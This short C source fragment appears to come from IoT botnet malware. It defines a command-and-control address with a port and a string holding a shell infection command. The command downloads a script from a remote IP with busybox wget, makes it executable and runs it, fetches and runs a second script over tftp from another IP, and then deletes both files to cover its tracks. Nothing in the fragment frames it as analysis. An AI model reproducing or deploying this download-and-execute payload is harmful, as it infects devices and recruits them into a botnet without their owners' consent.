...
unsigned char *botnetNet[] = {"209.97.189.40:13"};
char *BBP = "cd /tmp; busybox wget http://209.97.189.40/salviaw1.sh; chmod 777 salviaw1.sh; busybox sh salviaw1.sh; busybox tftp 80.208.226.58 -c get salviat1.sh; chmod 777 salviat1.sh; busybox sh salviat1.sh; rm -rf salviaw1.sh salviat1.sh\r\n";
